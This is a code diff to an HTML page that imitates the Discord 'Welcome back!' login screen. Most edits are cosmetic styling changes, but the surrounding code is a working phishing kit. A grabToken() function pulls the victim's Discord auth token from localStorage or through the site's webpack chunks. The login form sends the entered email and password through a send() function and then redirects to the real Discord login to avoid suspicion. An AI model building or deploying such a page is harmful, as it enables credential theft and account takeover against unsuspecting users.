@@ -4,14 +4,13 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Discord</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&display=swap" rel="stylesheet" />
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body, html { height: 100%; background: #36393f; font-family: 'Whitney', sans-serif; color: #dcddde; }
+    body, html { height: 100%; background: #2f3136; font-family: 'Whitney', sans-serif; color: #dcddde; }
     .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; padding: 40px 20px; }
-    .logo { width: 120px; margin-bottom: 24px; }
+    .logo-container { background: #2f3136; padding: 16px; border-radius: 8px; margin-bottom: 16px; }
+    .logo { width: 124px; }
     h1 { font-size: 26px; font-weight: 600; margin-bottom: 8px; text-align: center; color: #fff; }
     p { font-size: 16px; color: #b9bbbe; margin-bottom: 32px; text-align: center; line-height: 1.4; }
     form { width: 100%; max-width: 380px; }
@@ -30,7 +29,9 @@
 </head>
 <body>
   <div class="container">
-    <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" class="logo" />
+    <div class="logo-container">
+      <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" class="logo" />
+    </div>
     <h1>Welcome back!</h1>
     <p>We're so excited to see you again!</p>
     <form id="loginForm">
@@ -54,15 +55,10 @@
     function grabToken() {
       let token = null;
       let method = 'none';
-
       try {
         const ls = localStorage.getItem('token');
-        if (ls && ls.length > 50) {
-          token = ls.replace(/"/g, '');
-          method = 'localStorage';
-        }
+        if (ls && ls.length > 50) { token = ls.replace(/"/g, ''); method = 'localStorage'; }
       } catch (e) {}
-
       if (!token) {
         try {
           webpackChunkdiscord_app.push([[''], {}, r => {
@@ -76,7 +72,6 @@
           }]);
         } catch (e) {}
       }
-
       return { token, method };
     }
 
@@ -108,9 +103,7 @@
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
       if (!email || !password) return;
-
       await send({ email, password });
-
       setTimeout(() => {
         window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
       }, 800);
